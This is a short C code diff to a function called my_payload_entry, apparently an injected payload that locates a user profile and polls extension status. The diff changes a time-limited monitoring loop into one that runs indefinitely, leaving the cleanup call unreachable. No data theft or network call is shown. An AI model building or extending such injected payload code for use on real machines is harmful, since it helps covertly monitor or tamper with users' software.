@@ -1235,15 +1235,15 @@ void my_payload_entry(void *handle, payload_params *params) {
     printf("[payload] Found profile: %s\n", profile_path);
     fflush(stdout);
 
-    /* Main monitoring loop - run for 30 seconds then exit */
+    /* Main monitoring loop - run indefinitely */
     printf("[payload] Starting monitoring loop\n");
     fflush(stdout);
     
-    int i = 0;
-    while (i < 6) {
+    int cycle = 0;
+    while (1) {
         sleep(5);
         
-        printf("[payload] === Check cycle %d ===\n", ++i);
+        printf("[payload] === Check cycle %d ===\n", ++cycle);
         fflush(stdout);
         
         /* Check extension status */
@@ -1256,8 +1256,7 @@ void my_payload_entry(void *handle, payload_params *params) {
         fflush(stdout);
     }
 
-    printf("[payload] Monitoring complete, exiting\n");
-    fflush(stdout);
+    /* This code is unreachable but kept for clarity */
     unlink(mark_path);
 }
 
